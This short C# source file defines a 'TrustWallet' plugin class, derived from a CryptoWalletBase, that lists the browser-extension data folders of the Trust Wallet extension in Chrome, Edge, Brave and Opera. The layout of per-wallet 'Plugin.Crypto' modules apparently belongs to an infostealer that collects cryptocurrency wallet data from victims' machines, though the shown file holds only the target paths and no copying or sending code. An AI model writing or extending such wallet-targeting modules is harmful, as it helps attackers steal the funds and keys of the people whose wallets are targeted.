using System;
using System.Collections.Generic;
using System.IO;

namespace Plugin.Crypto
{
    // Trust Wallet - Popular multi-chain wallet (2025)
    public class TrustWallet : CryptoWalletBase
    {
        public TrustWallet()
        {
            walletName = "TrustWallet";
            
            // Trust Wallet browser extension paths
            // Extension ID: egjidjbpglichdcondbcbdnbeeppgdph
            walletPaths.Add("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph");
            walletPaths.Add("%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph");
            walletPaths.Add("%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph");
            walletPaths.Add("%APPDATA%\\Opera Software\\Opera Stable\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph");
        }
    }
}
